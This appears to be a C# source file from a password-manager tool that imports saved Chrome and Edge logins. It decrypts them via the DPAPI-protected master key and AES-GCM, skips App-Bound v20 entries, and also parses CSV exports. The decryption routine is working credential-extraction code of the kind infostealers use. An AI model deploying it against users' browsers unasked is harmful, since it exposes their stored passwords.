using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;
using PwdTool.Models;

namespace PwdTool.Services;

public enum ChromiumBrowser
{
    Chrome,
    Edge,
}

/// <summary>
/// 从浏览器导入已保存的账号密码。
///
/// 重要限制（务必阅读 README"安全与合规说明"）：Chrome/Edge 127+（2024-07 起，
/// 2026 年现行版本已默认全量启用）引入了 App-Bound Encryption（ABE），新写入的
/// 密码条目前缀为 "v20"，其密钥受 SYSTEM-DPAPI 与 Elevation COM 服务双重保护，
/// 普通用户态进程（不注入、不提权）无法直接解密。本实现：
///   - 对仍是旧格式（"v10"/"v11"，DPAPI CurrentUser 直接可解）的条目正常导入；
///   - 对 "v20" 新格式条目跳过，计入 <see cref="ImportResult.SkippedNewFormat"/>；
///   - 同时支持从浏览器"设置 &gt; 密码 &gt; 导出"得到的官方 CSV 文件导入，
///     这是覆盖新格式密码的推荐正规途径。
/// </summary>
public static class BrowserImporter
{
    public class ImportResult
    {
        /// <summary>成功解密/解析出的账号列表。</summary>
        public List<AccountEntry> Entries { get; } = new();

        /// <summary>因 App-Bound Encryption（v20）而无法解密、被跳过的条目数。</summary>
        public int SkippedNewFormat { get; set; }

        /// <summary>致命错误信息（例如找不到浏览器数据目录）；为空表示无致命错误。</summary>
        public string? Error { get; set; }
    }

    #region Chrome / Edge 直读（v10/v11）

    public static ImportResult ImportFromChromium(ChromiumBrowser browser)
    {
        var result = new ImportResult();
        string source = browser == ChromiumBrowser.Chrome ? "Chrome" : "Edge";
        string userDataDir = GetChromiumUserDataDir(browser);

        if (!Directory.Exists(userDataDir))
        {
            result.Error = $"未找到 {source} 的数据目录，可能未安装该浏览器。";
            return result;
        }

        CleanupOrphanedTempFiles(); // 清理上次导入中途被强制终止后残留的临时解密文件

        byte[] masterKey;
        try
        {
            masterKey = GetMasterKey(userDataDir);
        }
        catch (Exception ex)
        {
            result.Error = $"解析 {source} 主密钥失败：{ex.Message}";
            return result;
        }

        int skippedNewFormat = 0;

        foreach (var profileDir in GetProfileDirs(userDataDir))
        {
            string loginDataPath = Path.Combine(profileDir, "Login Data");
            if (!File.Exists(loginDataPath)) continue;

            // Login Data 在浏览器运行时被独占锁定，先复制一份到临时目录再打开。
            string tempCopy = Path.Combine(Path.GetTempPath(), $"PwdTool_{Guid.NewGuid():N}.db");
            string tempCopyWal = tempCopy + "-wal";
            string tempCopyShm = tempCopy + "-shm";
            try
            {
                File.Copy(loginDataPath, tempCopy, overwrite: true);
                // Chromium 默认以 WAL 模式访问 Login Data，最近写入的记录可能只存在于
                // -wal（及 -shm）伴随文件里、尚未合并回主库；只复制主文件在浏览器仍在运行时
                // 可能读不到最近新增/修改的密码。一并复制这两个伴随文件（若存在），
                // SQLite 打开 tempCopy 时会按命名约定自动识别并合并。
                CopyIfExists(loginDataPath + "-wal", tempCopyWal);
                CopyIfExists(loginDataPath + "-shm", tempCopyShm);

                using var conn = new SqliteConnection($"Data Source={tempCopy};Mode=ReadOnly;");
                conn.Open();

                using var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
                    string username = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
                    if (reader.IsDBNull(2)) continue;

                    var blob = (byte[])reader[2];
                    string? password = DecryptChromiumPassword(blob, masterKey, ref skippedNewFormat);
                    if (password == null) continue;
                    if (string.IsNullOrEmpty(username) && string.IsNullOrEmpty(password)) continue;

                    result.Entries.Add(new AccountEntry
                    {
                        Title = ExtractHostForTitle(url),
                        Url = url,
                        Username = username,
                        Password = password,
                        Source = source,
                    });
                }
            }
            catch (Exception ex)
            {
                // 单个 Profile 失败不应中断其它 Profile 的导入，记录下来供用户参考。
                result.Error = (result.Error == null ? string.Empty : result.Error + "; ")
                    + $"{Path.GetFileName(profileDir)}: {ex.Message}";
            }
            finally
            {
                TryDeleteFile(tempCopy);
                TryDeleteFile(tempCopyWal);
                TryDeleteFile(tempCopyShm);
            }
        }

        result.SkippedNewFormat = skippedNewFormat;
        return result;
    }

    private static string GetChromiumUserDataDir(ChromiumBrowser browser)
    {
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        return browser switch
        {
            ChromiumBrowser.Chrome => Path.Combine(localAppData, "Google", "Chrome", "User Data"),
            ChromiumBrowser.Edge => Path.Combine(localAppData, "Microsoft", "Edge", "User Data"),
            _ => throw new ArgumentOutOfRangeException(nameof(browser)),
        };
    }

    private static IEnumerable<string> GetProfileDirs(string userDataDir)
    {
        string defaultDir = Path.Combine(userDataDir, "Default");
        if (Directory.Exists(defaultDir))
        {
            yield return defaultDir;
        }

        foreach (var dir in Directory.EnumerateDirectories(userDataDir, "Profile *"))
        {
            yield return dir;
        }
    }

    /// <summary>
    /// 解析 Local State 里的 os_crypt.encrypted_key，去掉 5 字节 "DPAPI" 前缀后
    /// 用 DPAPI(CurrentUser) 解出 32 字节 AES-256 主密钥。
    /// </summary>
    private static byte[] GetMasterKey(string userDataDir)
    {
        string localStatePath = Path.Combine(userDataDir, "Local State");
        string json = File.ReadAllText(localStatePath);
        using var doc = JsonDocument.Parse(json);
        string encryptedKeyB64 = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString()
            ?? throw new InvalidDataException("Local State 中缺少 os_crypt.encrypted_key。");

        byte[] withPrefix = Convert.FromBase64String(encryptedKeyB64);
        const int dpapiPrefixLength = 5; // "DPAPI" 的 ASCII 字节数
        if (withPrefix.Length <= dpapiPrefixLength)
        {
            throw new InvalidDataException("encrypted_key 长度异常。");
        }

        byte[] encryptedKey = withPrefix[dpapiPrefixLength..];
        return ProtectedData.Unprotect(encryptedKey, optionalEntropy: null, scope: DataProtectionScope.CurrentUser);
    }

    /// <summary>
    /// 解密单条 password_value blob。
    /// 结构：3 字节 ASCII 前缀（"v10"/"v11"/"v20"） + 12 字节 nonce + 密文 + 16 字节 GCM tag。
    /// "v20" 属于 App-Bound Encryption，无法用此方式解密，直接计数跳过。
    /// </summary>
    private static string? DecryptChromiumPassword(byte[] blob, byte[] masterKey, ref int skippedNewFormat)
    {
        if (blob.Length < 3) return null;

        string prefix = Encoding.ASCII.GetString(blob, 0, 3);
        if (prefix == "v20")
        {
            skippedNewFormat++;
            return null;
        }

        if (prefix != "v10" && prefix != "v11")
        {
            return null; // 未识别的格式，不处理
        }

        const int nonceSize = 12;
        const int tagSize = 16;
        if (blob.Length < 3 + nonceSize + tagSize)
        {
            return null;
        }

        byte[] nonce = blob[3..(3 + nonceSize)];
        byte[] tag = blob[^tagSize..];
        byte[] cipher = blob[(3 + nonceSize)..^tagSize];
        byte[] plainBytes = new byte[cipher.Length];

        try
        {
            using var aesGcm = new AesGcm(masterKey, tagSize);
            aesGcm.Decrypt(nonce, cipher, tag, plainBytes);
            return Encoding.UTF8.GetString(plainBytes);
        }
        catch (CryptographicException)
        {
            return null;
        }
    }

    private static string ExtractHostForTitle(string url)
    {
        try
        {
            return new Uri(url).Host;
        }
        catch
        {
            return url;
        }
    }

    private static void TryDeleteFile(string path)
    {
        try
        {
            if (File.Exists(path)) File.Delete(path);
        }
        catch
        {
            // 临时文件删除失败不影响导入结果，忽略。
        }
    }

    private static void CopyIfExists(string sourcePath, string destPath)
    {
        try
        {
            if (File.Exists(sourcePath)) File.Copy(sourcePath, destPath, overwrite: true);
        }
        catch
        {
            // 复制伴随文件失败时退回只读主库，不影响主流程。
        }
    }

    /// <summary>
    /// 清理上次导入过程中若被强制结束进程（任务管理器杀进程/系统崩溃/断电）而残留在
    /// %TEMP% 下的解密临时文件——正常路径下的 finally 块能覆盖绝大多数情况，
    /// 这里作为兜底，在每次开始新的导入时顺手清一遍。
    /// </summary>
    private static void CleanupOrphanedTempFiles()
    {
        try
        {
            string tempDir = Path.GetTempPath();
            foreach (var file in Directory.EnumerateFiles(tempDir, "PwdTool_*.db*"))
            {
                TryDeleteFile(file);
            }
        }
        catch
        {
            // 清理失败不影响本次导入，忽略。
        }
    }

    #endregion

    #region CSV 导入（浏览器官方导出，覆盖新版 v20 密码）

    public static ImportResult ImportFromCsv(string filePath)
    {
        var result = new ImportResult();

        if (!File.Exists(filePath))
        {
            result.Error = "找不到指定的 CSV 文件。";
            return result;
        }

        string content;
        try
        {
            content = File.ReadAllText(filePath);
        }
        catch (Exception ex)
        {
            result.Error = "读取 CSV 文件失败：" + ex.Message;
            return result;
        }

        var rows = ParseCsv(content);
        if (rows.Count < 2)
        {
            result.Error = "CSV 文件为空或缺少数据行。";
            return result;
        }

        var header = rows[0].Select(h => h.Trim().ToLowerInvariant()).ToList();
        int idxName = FindColumn(header, "name", "title", "标题");
        int idxUrl = FindColumn(header, "url", "login_uri", "origin_url", "website", "网址");
        int idxUser = FindColumn(header, "username", "login_username", "user", "账号", "用户名");
        int idxPass = FindColumn(header, "password", "login_password", "密码");

        if (idxPass < 0)
        {
            result.Error = "CSV 文件缺少 password 列，无法导入。";
            return result;
        }

        for (int i = 1; i < rows.Count; i++)
        {
            var row = rows[i];
            if (row.Count == 0 || (row.Count == 1 && row[0].Length == 0)) continue;

            string Get(int idx) => idx >= 0 && idx < row.Count ? row[idx] : string.Empty;

            string password = Get(idxPass);
            if (string.IsNullOrEmpty(password)) continue;

            string url = Get(idxUrl);
            string username = Get(idxUser);
            string title = idxName >= 0 ? Get(idxName) : ExtractHostForTitle(url);

            result.Entries.Add(new AccountEntry
            {
                Title = title,
                Url = url,
                Username = username,
                Password = password,
                Source = "CSV导入",
            });
        }

        return result;
    }

    private static int FindColumn(List<string> header, params string[] candidates)
    {
        foreach (var candidate in candidates)
        {
            int idx = header.IndexOf(candidate);
            if (idx >= 0) return idx;
        }
        return -1;
    }

    /// <summary>最小 RFC4180 风格 CSV 解析：支持双引号包裹字段、双引号转义、字段内换行。</summary>
    private static List<List<string>> ParseCsv(string content)
    {
        var rows = new List<List<string>>();
        var currentRow = new List<string>();
        var field = new StringBuilder();
        bool inQuotes = false;

        for (int i = 0; i < content.Length; i++)
        {
            char c = content[i];

            if (inQuotes)
            {
                if (c == '"')
                {
                    if (i + 1 < content.Length && content[i + 1] == '"')
                    {
                        field.Append('"');
                        i++;
                    }
                    else
                    {
                        inQuotes = false;
                    }
                }
                else
                {
                    field.Append(c);
                }
                continue;
            }

            switch (c)
            {
                case '"':
                    inQuotes = true;
                    break;
                case ',':
                    currentRow.Add(field.ToString());
                    field.Clear();
                    break;
                case '\r':
                    break; // 忽略，换行统一由 \n 处理
                case '\n':
                    currentRow.Add(field.ToString());
                    field.Clear();
                    rows.Add(currentRow);
                    currentRow = new List<string>();
                    break;
                default:
                    field.Append(c);
                    break;
            }
        }

        if (field.Length > 0 || currentRow.Count > 0)
        {
            currentRow.Add(field.ToString());
            rows.Add(currentRow);
        }

        return rows;
    }

    #endregion
}
